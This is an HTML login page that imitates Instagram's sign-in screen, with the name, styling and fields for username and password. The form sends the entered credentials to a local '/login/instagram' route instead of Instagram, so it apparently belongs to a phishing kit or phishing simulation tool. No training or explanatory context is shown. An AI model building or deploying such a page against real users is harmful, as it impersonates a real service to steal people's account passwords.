<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Log In</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <style>
        body {
            background: #fafafa;
        }
        .card {
            border: 1px solid #dbdbdb;
            box-shadow: none;
            padding: 32px 40px;
        }
        .form-group input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 12px 8px;
            font-size: 13px;
        }
        .form-group input:focus {
            border-color: #a8a8a8;
            box-shadow: none;
        }
        .btn-primary {
            background: #0095f6;
            border-radius: 8px;
            font-size: 14px;
            padding: 10px;
        }
        .btn-primary:hover {
            background: #1877f2;
        }
        .links a {
            color: #00376b;
            font-size: 13px;
        }
        .footer-text {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <div class="instagram-logo">Instagram</div>
            </div>
            <form action="/login/instagram" method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Phone number, username, or email" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn-primary">Log In</button>
            </form>
            <div class="divider">OR</div>
            <div class="links">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        <div class="card" style="margin-top: 10px; padding: 20px; box-shadow: none; border: 1px solid #dbdbdb;">
            <p class="footer-text">
                Don't have an account? <a href="#">Sign up</a>
            </p>
        </div>
    </div>
</body>
</html>
